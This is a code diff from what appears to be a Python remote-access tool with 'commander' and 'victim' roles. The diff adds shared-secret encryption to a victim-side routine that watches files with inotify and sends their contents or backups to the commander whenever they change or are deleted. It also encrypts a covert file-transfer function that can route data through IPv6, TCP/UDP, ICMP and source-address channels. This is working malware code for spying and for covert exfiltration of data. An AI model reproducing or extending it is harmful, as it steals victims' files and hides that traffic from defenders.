@@ -128,7 +128,7 @@ def watch_stop_signal(client_socket: socket.socket,
                       shared_secret: bytes):
     while True:
         try:
-            signal = decrypt_string(client_socket.recv(100).decode(), shared_secret)
+            signal = decrypt_string(client_socket.recv(1024).decode(), shared_secret)
             if signal == constants.STOP_KEYWORD:
                 print(constants.CLIENT_RESPONSE.format(signal))
                 signal_queue.put(signal)
@@ -207,7 +207,8 @@ def remove_file(file_path: str):
 
 def watch_file(client_socket: socket.socket,
                file_path: str,
-               signal_queue: queue.Queue):
+               signal_queue: queue.Queue,
+               shared_secret: bytes):
     # Create an inotify object
     notifier = inotify.adapters.Inotify()
     print("[+] WATCHING FILE: Now watching the following file: {}".format(file_path))
@@ -242,16 +243,15 @@ def watch_file(client_socket: socket.socket,
                     # c) If Modified -> Send events to Commander for modification
                     if "IN_MODIFY" in type_names:
                         print(constants.WATCH_FILE_MODIFIED.format(watch_path))
-                        client_socket.send("IN_MODIFY".encode())
+                        client_socket.send(encrypt_string("IN_MODIFY", shared_secret).encode())
 
-                        # i) Start file transfer
-                        with open(file_path, 'rb') as file:
-                            while True:
-                                file_data = file.read(1024)
-                                if not file_data:
-                                    break
-                                client_socket.send(file_data)
+                        # i) Encrypt File + Start file transfer
+                        encrypted_file = encrypt_file(file_path, shared_secret)
 
+                        # Send encrypted file data
+                        client_socket.sendall(encrypted_file)
+
+                        # Send EOF
                         client_socket.send(constants.END_OF_FILE_SIGNAL)
                         print(constants.WATCH_FILE_TRANSFER_SUCCESS.format(file_path))
 
@@ -261,19 +261,18 @@ def watch_file(client_socket: socket.socket,
                     # d) If Deleted -> Send events to notify commander that file has been deleted
                     if "IN_DELETE" in type_names or "IN_DELETE_SELF" in type_names:
                         print(constants.WATCH_FILE_DELETED.format(watch_path))
-                        client_socket.send("IN_DELETE".encode())
+                        client_socket.send(encrypt_string("IN_DELETE", shared_secret).encode())
 
                         # i) Get backup file path
                         backup_file_name = constants.BACKUP_MODIFIER + "_" + watch_path
 
                         # ii) Start file transfer
-                        with open(backup_file_name, 'rb') as file:
-                            while True:
-                                file_data = file.read(1024)
-                                if not file_data:
-                                    break
-                                client_socket.send(file_data)
+                        encrypted_file = encrypt_file(backup_file_name, shared_secret)
 
+                        # Send encrypted file data
+                        client_socket.sendall(encrypted_file)
+
+                        # Send EOF
                         client_socket.send(constants.END_OF_FILE_SIGNAL)
                         print(constants.WATCH_FILE_TRANSFER_SUCCESS.format(file_path))
 
@@ -3802,10 +3801,10 @@ def transfer_file_covert(sock: socket.socket, dest_ip: str,
                 return None
 
             if constants.SOURCE_ADDRESS_FIELD in choices:
-                selected_function(sock, dest_ip, dest_port, source_port, file_path)
+                selected_function(sock, dest_ip, dest_port, source_port, file_path, shared_secret)
 
             elif selected_function is not None and callable(selected_function):
-                selected_function(sock, dest_ip, file_path)
+                selected_function(sock, dest_ip, file_path, shared_secret)
 
         # DIFFERENT HANDLERS: IPv6
         elif constants.IPV6 in choices:
@@ -3818,15 +3817,15 @@ def transfer_file_covert(sock: socket.socket, dest_ip: str,
 
             # Get IPv6 address and port from commander
             cmdr_ipv6_addr, cmdr_ipv6_port = sock.recv(1024).decode().split("/")
-            selected_function(sock, cmdr_ipv6_addr, int(cmdr_ipv6_port), file_path)
+            selected_function(sock, cmdr_ipv6_addr, int(cmdr_ipv6_port), file_path, shared_secret)
 
         # DIFFERENT HANDLERS: TCP or UDP
         elif constants.TCP in choices or constants.UDP in choices:
-            selected_function(sock, dest_ip, dest_port, source_port, file_path)
+            selected_function(sock, dest_ip, dest_port, source_port, file_path, shared_secret)
 
         # DIFFERENT HANDLERS: ICMP
         elif constants.ICMP in choices:
-            selected_function(sock, dest_ip, file_path)
+            selected_function(sock, dest_ip, file_path, shared_secret)
 
         else:
             print(constants.CALL_MAP_FUNCTION_ERROR)
@@ -3836,7 +3835,7 @@ def transfer_file_covert(sock: socket.socket, dest_ip: str,
         return None
 
     # Get an ACK from the victim for success
-    transfer_result = sock.recv(1024).decode()
+    transfer_result = decrypt_string(sock.recv(1024).decode(), shared_secret)
 
     if transfer_result == constants.VICTIM_ACK:
         print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_path,
